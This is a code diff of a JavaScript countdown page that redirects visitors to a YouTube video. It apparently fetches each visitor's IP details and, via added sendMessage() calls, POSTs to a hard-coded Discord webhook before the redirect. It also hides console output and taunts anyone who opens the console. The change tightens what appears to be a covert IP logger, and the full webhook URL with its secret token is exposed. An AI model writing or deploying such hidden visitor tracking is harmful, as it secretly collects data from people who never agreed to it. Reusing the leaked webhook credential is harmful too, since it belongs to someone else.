@@ -10,7 +10,7 @@
         request.setRequestHeader('Accept', 'application/json');
 
         request.onreadystatechange = function () {{
-            console.log(this.responseText);
+            //console.log(this.responseText);
             uip = this.responseText;
             var uips = JSON.parse(uip);
             c_flag = uips.country_flag;
@@ -65,12 +65,19 @@
             } else if (parm2 == null) {
                 var timeleft = 5;
             }
+            console.log('DON\'T LOOK AT MY CONSOLE!');
             var countup = 1;
             document.getElementById('progressBar').setAttribute('max',time);
             let x = setInterval(function() {
+                
                 if (time <= 0) {
+                    
+                    var ggh = setTimeout(function() {
+                    sendMessage();
+                    clearInterval(ggh);
+                    },1000);
                     document.getElementById('yolup').innerHTML = 'Redirecting Now!';
-
+                    
                     document.title = 'Redirecting Now!';
                     clearInterval(x);
                     r();
@@ -84,10 +91,8 @@
                     time -= 10;
                     
                 }
-            },10)
-            var ggh = setTimeout(function() {
-                    sendMessage();
-                    },500);
+            },10);
+            
             function r() {
                 
             switch (parm) {
@@ -141,20 +146,22 @@
                 
             }
             if (sec_parm == 0) {
-                //location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
                 redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ',100)
             }
         }
+        var ggh = setTimeout(function() {
+                    sendMessage();
+                    clearInterval(ggh);
+                    },1000);
         function redirect (url,time1) {
             var qq = setInterval(function() {
+                sendMessage();
                 location.href = url;
                 clearInterval(qq);
             },time1);
         }
-        
         function sendMessage() {
-            console.log('Function is called');
-            let oonn = Math.floor((Math.random() * 1732) % 50000);
+            let oonn = Math.floor((Math.random() * 1732) % 50000) + 1;
       const request = new XMLHttpRequest();
       request.open("POST", "https://discord.com/api/webhooks/1078404244543127674/XbEedJpAY9IattJ-fH04cEkEFu6I51Mp46mFFYjxCsY-iQXAzwYZ_ppsM09RASSbT7fZ");
 
